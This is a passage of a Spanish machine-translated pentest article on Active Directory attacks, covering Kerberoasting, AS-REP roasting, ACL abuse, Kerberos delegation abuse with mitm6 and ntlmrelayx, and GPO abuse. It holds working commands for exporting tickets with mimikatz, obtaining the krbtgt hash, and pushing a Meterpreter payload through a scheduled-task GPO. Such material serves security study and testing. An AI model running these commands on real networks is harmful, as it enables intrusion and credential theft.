<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">dominio.</a> <br><br>  El ataque de Kerberoasting tiene 2 enfoques. <br><br>  1. El viejo m√©todo.  Los tickets TGS se solicitan a trav√©s de setspn.exe o .NET System.IdentityModel.Tokens.KerberosRequestorSecurityToken de la clase Powershell, recuperados de la memoria utilizando mimikatz, luego convertidos al formato deseado (John, Hashcat) y ordenados. <br><br>  2. El nuevo m√©todo.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">machosec</a> not√≥ que la clase <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">KerberosRequestorSecurityToken</a> tiene un m√©todo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">GetRequest</a> , que extrae la parte encriptada con una contrase√±a de un ticket TGS. <br><br>  Herramientas para realizar un ataque: <br><br>  1) Buscar registros SPN <br><br><ul><li>  <a href="">GetUserSPN.ps1</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Find-PSServiceAccounts.ps1</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Get-NetUSER -SPN</a> </li><li>  (Get-ADUser -Filter {ServicePrincipalName -ne "$ null"} -Properties ServicePrincipalName) .ServicePrincipalName </li></ul><br>  2) Solicite un boleto de TGS <br><br><ul><li>  setspn.exe (utilidad nativa de Windows) </li><li>  Solicitud de entradas a trav√©s de powershell <br><br><pre> <code class="plaintext hljs">Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ‚Äú&lt;ServicePrincipalName&gt;‚Äù</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Request-SPNTicket</a> </li></ul><br>  Puede ver los tickets en cach√© actuales con el comando klist. <br><br><div class="spoiler">  <b class="spoiler_title">Registros comunes de SPN</b> <div class="spoiler_text"><ul><li>  TERMSRV - Escritorio remoto </li><li>  SmtpSVC y SMTP - Correo </li><li>  WSMAN - WinRM </li><li>  ExchangeAB, ExchangeRFR, ExchangeMDM - MS Exchange </li><li>  POP / POP3 - Servicio postal POP3 </li><li>  IMAP / IMAP4 - Servicio de correo electr√≥nico IMAP </li><li>  MSSQLSvc - Microsoft SQL Server </li><li>  MONGO - Servidor de base de datos MongoDB </li><li>  DNS: servidor DNS </li><li>  HTTP, WWW - Servidor web </li><li>  LDAP - LDAP </li><li>  FTP - Servidor FTP </li></ul><br></div></div><br>  3) Exportaci√≥n de boletos: <br><br><ul><li>  <a href="">Invoke-Mimikatz</a> -Command '"Kerberos :: list / export"' </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Mimikatz</a> -Command '"Kerberos :: list / export"' </li><li>  <a href="">Invioke-kerberoast</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">tgsrepack.py</a> </li></ul><br><br>  Un ejemplo de ejecuci√≥n automatizada de los 3 puntos: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">RiskiskSPN</a> <br><br><pre> <code class="bash hljs">Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format <span class="hljs-string"><span class="hljs-string">"Hashcat"</span></span> | Out-File kerberoasting.txt</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Powersploit</a> <br><br><pre> <code class="bash hljs">Invoke-Kerberoast -Domain jet.lab -OutputFormat Hashcat | fl</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">GetUserSPNs.py</a> <br><br><pre> <code class="bash hljs">GetUserSPNs.py -request jet.lab\user:Password</code> </pre> </li></ul><br><h3>  Asreproast </h3><br>  La vulnerabilidad es que la autenticaci√≥n previa de Kerberos est√° deshabilitada.  En este caso, podemos enviar solicitudes AS-REQ a un usuario que tenga desactivada la autenticaci√≥n previa de Kerberos y obtener la parte encriptada con una contrase√±a. <br><br><img src="https://habrastorage.org/webt/zd/pm/h5/zdpmh5i7cas-s0gtv2uopy2sj14.png"><br><br>  La vulnerabilidad es rara, ya que deshabilitar la autenticaci√≥n previa no es la configuraci√≥n predeterminada. <br><br>  B√∫squeda de usuarios con autenticaci√≥n Kerberos deshabilitada: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Powerview</a> <br><br><pre> <code class="bash hljs">Get-DomainUser -PreauthNotRequired -Properties samaccountname -Verbose</code> </pre> </li><li>  M√≥dulo de Active Directory <br><br><pre> <code class="bash hljs">get-aduser -filter * -properties DoesNotRequirePreAuth | <span class="hljs-built_in"><span class="hljs-built_in">where</span></span> {<span class="hljs-variable"><span class="hljs-variable">$_</span></span>.DoesNotRequirePreAuth -eq <span class="hljs-string"><span class="hljs-string">"True"</span></span> -and <span class="hljs-variable"><span class="hljs-variable">$_</span></span>.Enabled -eq <span class="hljs-string"><span class="hljs-string">"True"</span></span>} | select Name</code> </pre> </li></ul><br>  Obteniendo la parte encriptada: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">ASREPRoast</a> <br><br><pre> <code class="bash hljs">Invoke-ASREPROast | fl</code> </pre> <br><img src="https://habrastorage.org/webt/i_/o-/vf/i_o-vfbviphgjknolenx_qoesyo.png"></li></ul><br><br><h1>  Ataque a trav√©s de ACL </h1><br>  Una ACL en un contexto de dominio es un conjunto de reglas que definen los derechos de acceso de los objetos en AD.  Se puede configurar una ACL para un solo objeto (por ejemplo, una cuenta de usuario) o para una unidad organizativa, por ejemplo, OU.  Cuando configura la ACL en la OU, todos los objetos dentro de la OU heredar√°n la ACL.  Las ACL contienen entradas de control de acceso (ACE) que determinan c√≥mo interact√∫a el SID con el objeto de Active Directory. <br><br>  Por ejemplo, tenemos tres grupos: A, B, C, donde el grupo C es miembro del grupo B y el grupo B es miembro del grupo A. Cuando agrega un invitado al grupo C, el invitado no solo ser√° miembro del grupo C, sino tambi√©n un miembro indirecto de los grupos B y A. Al agregar acceso a un objeto de dominio al grupo A, el usuario invitado tambi√©n tendr√° acceso a este objeto.  En una situaci√≥n en la que el usuario es miembro directo de un solo grupo, y este grupo es miembro indirecto de los otros 50 grupos, es f√°cil perder la conexi√≥n de los permisos heredados. <br><br>  Puede obtener las ACL asociadas con un objeto ejecutando el siguiente comando <br><br><pre> <code class="bash hljs">Get-ObjectACL -Samaccountname Guest -ResolveGUIDs</code> </pre> <br>  Puede usar la herramienta para explotar errores en la configuraci√≥n de ACL. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Invoke-ACLPwn</a> .  El script de Powershell recopila informaci√≥n sobre todas las ACL en el dominio utilizando el recopilador BloodHound, SharpHound, y crea una cadena para obtener el permiso writeDACL.  Despu√©s de construir la cadena, el script opera cada paso de la cadena.  El orden del gui√≥n: <br><br><ol><li>  El usuario se agrega a los grupos necesarios. </li><li>  Se agregan dos ACE (Replicar cambios de directorio y Replicar cambios de directorio ALL) a las ACL del objeto de dominio. </li><li>  Si tiene derechos para DCSync utilizando la utilidad Mimikatz, se solicita el hash de contrase√±a del usuario krbtgt (configuraci√≥n predeterminada). </li><li>  Una vez completada la operaci√≥n, el script elimina todos los grupos agregados y las entradas ACE en la ACL. </li></ol><br>  El script est√° dirigido solo a usar permisos writeDACL.  Los siguientes derechos de acceso tambi√©n pueden ser de inter√©s para un atacante: <br><br><ul><li>  ForceChangePassword.  Derechos para cambiar la contrase√±a del usuario cuando no se conoce la contrase√±a actual.  Operaci√≥n con PowerSploit - Set-DomainUserPassword. </li><li>  AddMembers.  Derechos para agregar grupos, computadoras y usuarios a grupos.  Operaci√≥n con PowerSploit - Add-DomainGroupMember. </li><li>  GenericWrite  Derechos para cambiar los atributos de un objeto.  Por ejemplo, cambie el valor del par√°metro scriptPath.  La pr√≥xima vez que el usuario inicie sesi√≥n en el sistema, se iniciar√° el archivo especificado.  Operaci√≥n con PowerSploit - Set-DomainObject. </li><li>  WriteOwner.  Derechos para cambiar el propietario del objeto.  Operaci√≥n con PowerSploit - Set-DomainObjectOwner. </li><li>  AllExtendedRights.  Derechos para agregar usuarios a grupos, cambiar contrase√±as de usuarios, etc. Operaci√≥n con PowerSploit - Set-DomainUserPassword o Add-DomainGroupMember. </li></ul><br>  Operaci√≥n <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Invocar-aclpwn</a> </li></ul><br>  Comenzando desde una m√°quina que est√° en un dominio <br><br><pre> <code class="bash hljs">./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe</code> </pre> <br>  Comenzando desde una m√°quina que no est√° en un dominio <br><br><pre> <code class="bash hljs">/Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username <span class="hljs-string"><span class="hljs-string">'domain\user'</span></span> -Domain <span class="hljs-string"><span class="hljs-string">'fqdn_of_target_domain'</span></span> -Password <span class="hljs-string"><span class="hljs-string">'Pass'</span></span></code> </pre> <br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aclpwn.py</a> es una herramienta similar escrita en Python </li></ul><br><h3>  Delegaci√≥n Kerberos </h3><br>  La delegaci√≥n de autoridad de Kerberos le permite reutilizar las credenciales de usuario final para acceder a los recursos alojados en otro servidor. <br><br>  La delegaci√≥n de Kerberos puede ser de tres tipos: <br><br><ol><li>  Ilimitado (delegaci√≥n sin restricciones).  La √∫nica opci√≥n de delegaci√≥n antes de Windows Server 2003 </li><li>  Delegaci√≥n restringida desde Windows Server 2003 </li><li>  Delegaci√≥n restringida basada en recursos  Introducido en Windows Server 2012 </li></ol><br><h4>  Delegaci√≥n ilimitada </h4><br>  En el complemento de Active Directory, la funci√≥n de delegaci√≥n ilimitada habilitada es la siguiente: <br><br><img src="https://habrastorage.org/webt/ip/mp/e8/ipmpe8ygslgtbdklbkiseqtwg64.png"><br><br>  Para mayor claridad, considere c√≥mo se produce una delegaci√≥n ilimitada en un diagrama. <br><br><img src="https://habrastorage.org/webt/1i/p1/wq/1ip1wqkjnc9plqcqzmpkr1rcfwg.png"><br><br><ol><li>  La contrase√±a del usuario se convierte a ntlm hash.  La marca de tiempo se cifra con este hash y se env√≠a al controlador de dominio para solicitar un ticket TGT. </li><li>  El controlador de dominio verifica la informaci√≥n sobre el usuario (restricci√≥n de inicio de sesi√≥n, membres√≠a en grupos, etc.), crea un ticket TGT y lo env√≠a al usuario.  El ticket TGT est√° encriptado, firmado y solo krbtgt puede leer sus datos. </li><li>  El usuario solicita un ticket TGS para acceder al servicio web en el servidor web. </li><li>  El controlador de dominio proporciona un ticket TGS. </li><li>  El usuario env√≠a tickets TGT y TGS al servidor web. </li><li>  La cuenta de servicio del servidor web utiliza el ticket TGT del usuario para solicitar un ticket TGS para acceder al servidor de la base de datos. </li><li>  La cuenta de servicio se conecta al servidor de la base de datos como usuario. </li></ol><br>  El principal peligro de la delegaci√≥n ilimitada es que cuando una m√°quina con delegaci√≥n ilimitada se ve comprometida, un atacante podr√° obtener tickets TGT de los usuarios de esta m√°quina y acceder a cualquier sistema en el dominio en nombre de estos usuarios. <br><br>  Busque m√°quinas en un dominio con delegaci√≥n ilimitada: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Powerview</a> <br><br><pre> <code class="bash hljs">Get-NetComputer -unconstrained</code> </pre> </li><li>  M√≥dulo de Active Directory <br><br><pre> <code class="bash hljs">Get-Adcomputer -Filter {TrustedForDelegation -eq <span class="hljs-variable"><span class="hljs-variable">$True</span></span>}</code> </pre>  . </li></ul><br>  Exportaci√≥n de entradas: <br><br><ul><li>  Usando mimikatz.  sekurlsa :: tickets / export </li><li>  Tambi√©n puedes realizar un ataque Pass-The-ticket. <br><br><pre> <code class="bash hljs"> kerberos::ptt C:\tickets\.</code> </pre> </li></ul><br><img src="https://habrastorage.org/webt/oa/wa/25/oawa25sduaj5u303b1q9svirdku.gif"><br><br><h4>  Delegaci√≥n limitada </h4><br>  El modo de delegaci√≥n limitada le permite acceder solo a los servicios permitidos y en una m√°quina espec√≠fica.  En el complemento de Active Directory, se ve as√≠: <br><br><img src="https://habrastorage.org/webt/xj/ku/no/xjkunogyspfpevoanui8nzxwlzq.png"><br><br>  Con delegaci√≥n limitada, se utilizan 2 extensiones de protocolo Kerberos: <br><br><ul><li>  S4uself </li><li>  S4UProxy </li></ul><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">S4U2Self se</a> usa cuando el cliente no se autentica usando el protocolo Kerberos. <br><br>  Para una delegaci√≥n ilimitada, TGT se utiliza para identificar al usuario, en cuyo caso la extensi√≥n S4U usa la estructura <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PA-FOR-USER</a> como el nuevo tipo en el campo de datos de padata / pre-autenticaci√≥n.  El proceso S4U2self solo se permite si el usuario solicitante tiene el campo TRUSTED_TO_AUTH_FOR_DELEGATION establecido en su userAccountControl. <br><br><img src="https://habrastorage.org/webt/oo/yk/5s/ooyk5sjtsusxcfkois5ej7dgnua.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">S4U2Proxy</a> permite que la cuenta de servicio use el ticket de redireccionamiento recibido en el proceso S4U2proxy para solicitar un ticket TGS para acceder a los servicios permitidos (msds-allowtodelegateto).  KDC verifica si el servicio solicitado se especifica en el campo msds-allowtodelegateto del usuario solicitante y emite un ticket si la verificaci√≥n es exitosa.  Por lo tanto, la delegaci√≥n est√° "limitada" a servicios espec√≠ficos de destino. <br><br><img src="https://habrastorage.org/webt/t-/a7/n6/t-a7n6ludbpsvmbk0ru_kwxvpq4.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puede buscar computadoras y usuarios en un dominio de delegaci√≥n limitado usando </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Busque computadoras con delegaci√≥n ilimitada</font></font><br><br><pre> <code class="bash hljs">Get-DomainComputer -TrustedtoAuth</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Buscar usuarios de delegaci√≥n limitada </font></font><br><br><pre> <code class="bash hljs">Get-DomainUser -TrustedtoAuth</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Para realizar un ataque, necesitamos una contrase√±a clara, un hash de contrase√±a NTLM o un ticket TGT. </font></font><br><br><img src="https://habrastorage.org/webt/gd/5f/fx/gd5ffxfwmgeqr5j28ovwzcqqacy.gif"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Delegaci√≥n limitada basada en recursos </font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Al igual que con la delegaci√≥n regular, se utilizan extensiones S4U. Dado que la delegaci√≥n basada en recursos es principalmente una delegaci√≥n limitada, los ataques que son relevantes para la delegaci√≥n limitada regular tambi√©n est√°n disponibles aqu√≠. La √∫nica diferencia es que en una delegaci√≥n limitada simple, el servicio A deber√≠a tener el </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">atributo msDS-allowedToDelegateTo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> = ServiceB, y aqu√≠ el servicio B deber√≠a tener el </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">atributo msDS-enabledToActOnBehalfOfOtherIdentity</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> = Service A. </font></font><br><br><img src="https://habrastorage.org/webt/td/um/jl/tdumjlcportki98xbixgfo1jaiu.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Esta propiedad permite un </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ataque</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> m√°s </font><font style="vertical-align: inherit;">publicado por </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">harmj0y</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Un ataque requiere permisos para modificar el par√°metro PrincipalsAllowedToDelegateToAccount, que establece el atributo msds-AllowToActOnBehalfOfOtherIdentity, que contiene una lista de control de acceso (ACL). </font><font style="vertical-align: inherit;">A diferencia de la delegaci√≥n limitada, no necesitamos derechos de administrador de dominio para cambiar el atributo msds-allowedToActOnBehalfOfOtherIdentity. </font><font style="vertical-align: inherit;">Puede averiguar qui√©n tiene permiso para editar el atributo de la siguiente manera:</font></font><br><br><pre> <code class="plaintext hljs">(Get-acl "AD:$((get-adcomputer Windows7).distinguishedname)").access | Where-Object -Property ActiveDirectoryRights -Match WriteProperty |out-gridview</code> </pre> <br><img src="https://habrastorage.org/webt/ej/4p/bk/ej4pbkl5bkv5y75mqp54mxu0qcm.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Entonces, para llevar a cabo el ataque, ejecute mitm6 </font></font><br><br><pre> <code class="bash hljs">mitm6 -I vmnet0</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Comenzamos ntlmrelayx con la opci√≥n --delegate-access </font></font><br><br><pre> <code class="plaintext hljs">ntlmrelayx -t ldaps://dc1.jet.lab --delegate-access</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Como resultado del ataque, se crea una computadora ZGXTPVYX $ con derechos de delegaci√≥n a la computadora con Windows 7. </font></font><br><br><pre> <code class="plaintext hljs">$x = Get-ADComputer Windows7 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity $x.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access</code> </pre><br><img src="https://habrastorage.org/webt/21/oo/w9/21oow9kxnu53sg9wi-xnneus9fc.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Yegor Podmokov </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">present√≥</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> un buen informe de delegaci√≥n </font><font style="vertical-align: inherit;">en PHDays.</font></font><br><br><img src="https://habrastorage.org/webt/kr/ri/za/krrizaffbrqgiee3gd2kufqs8s4.gif"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Abusar de los permisos de GPO </font></font></h4><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Group Policy Objects</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> es una herramienta que permite a los administradores administrar eficientemente un dominio. </font><font style="vertical-align: inherit;">Pero sucede que a los usuarios se les asignan derechos innecesarios, incluido el cambio de pol√≠ticas de GPO. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Para demostrar el ejemplo, agregaremos al usuario de Ragnar los derechos para editar la Pol√≠tica de controladores de dominio predeterminados (en la vida real, los derechos de esta pol√≠tica se otorgan solo a los administradores de dominio, pero la esencia del ataque no cambia; en el caso de otra pol√≠tica, solo cambian los hosts controlados). </font></font><br><br><img src="https://habrastorage.org/webt/yw/on/ht/ywonhtpbkwdqffjvzck5hdhjgza.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enumere los derechos de todos los GPO en el dominio con </font></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br><br><pre> <code class="plaintext hljs">Get-NetGPO | % {Get-ObjectAcl -ResolveGUIDs -Name $_.Name}</code> </pre> <br><img src="https://habrastorage.org/webt/fk/cf/sk/fkcfskfmeohuicn13_76t190miy.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Un usuario de Ragnar tiene derecho a cambiar un GPO que tenga un GUID de 6AC1786C-016F-11D2-945F-00C04FB984F9. </font><font style="vertical-align: inherit;">Para determinar qu√© hosts en el dominio aplican esta pol√≠tica, ejecute el siguiente comando</font></font><br><br><pre> <code class="plaintext hljs">Get-NetOU -GUID "6AC1786C-016F-11D2-945F-00C04FB984F9" | % {Get-NetComputer -AdSpath $_}</code> </pre> <br><img src="https://habrastorage.org/webt/ou/ut/9c/ouut9cizgebvp9q_dkoifqlqgic.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tengo el host dc1.jet.lab. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conociendo la pol√≠tica espec√≠fica que el usuario de Ragnar puede editar y los hosts a los que se aplica esta pol√≠tica, podemos realizar varias acciones en el host dc1.jet.lab.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A continuaci√≥n se encuentran las opciones para usar el GPO</font></font></b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td> Computer Configuration\Preferences\Control Panel Settings\Folder Options </td><td> Create/alter file type associations, register DDE actions with those associations </td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Local Users and Groups </td><td> Add new local admin account </td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Scheduled Tasks </td><td> Deploy a new evil scheduled task (ie: PowerShell download cradle) </td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Services </td><td> Create and configure new evil services </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Files </td><td> Affected computers will download a file from the domain controller </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\INI Files </td><td> Update existing INI files </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Registry </td><td> Update specific registry keys. Very useful for disabling security mechanisms, or triggering code execution in any number of ways </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Shortcuts </td><td> Deploy a new evil shortcut </td></tr><tr><td> Computer Configuration\Policies\Software Settings\Software installation </td><td> Deploy an evil MSI. The MSI must be available to the GP client via a network share </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Scripts (startup/shutdown) </td><td> Configure and deploy evil startup scripts. Can run scripts out of GPO directory, can also run PowerShell commands with arguments </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Audit Policy </td><td> Modify local audit settings. Useful for evading detection </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignment\ </td><td> Grant a user the right to logon via RDP, grant a user SeDebugPrivilege, grant a user the right to load device drivers, grant a user seTakeOwnershipPrivilege. Basically, take over the remote computer without ever being an administrator on it </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Registry </td><td> Alter DACLs on registry keys, grant yourself an extremely hard to find backdoor on the system </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Windows Firewall </td><td> Manage the Windows firewall. Open up ports if they're blocked </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Environment </td><td> Add UNC path for DLL side loading </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Files </td><td> Copy a file from a remote UNC path </td></tr></tbody></table></div><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Las </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;">herramientas </font></a></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">New-GPOImmediateTask</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> y </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SharpGPOAbuse le</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> permiten:</font></font><br><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ejecutar tarea en el planificador de tareas </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Agregar derechos de usuario (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.) </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Agregar una secuencia de comandos que se ejecuta despu√©s del inicio </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Agregar usuario al grupo local </font></font></li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Por ejemplo, agregue una tarea en el programador de tareas para obtener una sesi√≥n de Meterpreter: </font></font><br><br><pre> <code class="plaintext hljs">New-GPOImmediateTask -TaskName test3 -GPODisplayName "Default Domain Controllers Policy" -CommandArguments '&lt;powershell_meterepreter_payload&gt;' -Force</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Despu√©s de la ejecuci√≥n, la tarea programada aparece prueba </font></font><br><br><img src="https://habrastorage.org/webt/dr/au/v8/drauv8km1pwp56jt_reymw8d5gw.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">y </font><font style="vertical-align: inherit;">aparece </font><font style="vertical-align: inherit;">la sesi√≥n de Meterpreter. </font></font><br><br><img src="https://habrastorage.org/webt/js/e6/g8/jse6g8vqatvnvr5h1qlx2mvrvzq.png"><br><br><img src="https://habrastorage.org/webt/zj/ct/wz/zjctwz7ca8xg5j6zbqoqlf3q9w0.gif"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Para eliminar una tarea programada, debe ejecutar el siguiente comando:</font></font><br><br><pre> <code class="plaintext hljs">New-GPOImmediateTask -Remove -Force -GPODisplayName SecurePolicy</code> </pre> <br><h1>  Conclusiones </h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En el art√≠culo examinamos solo algunos vectores de ataque. </font><font style="vertical-align: inherit;">Las vistas como </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enumerate Accounts y Password spray</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a 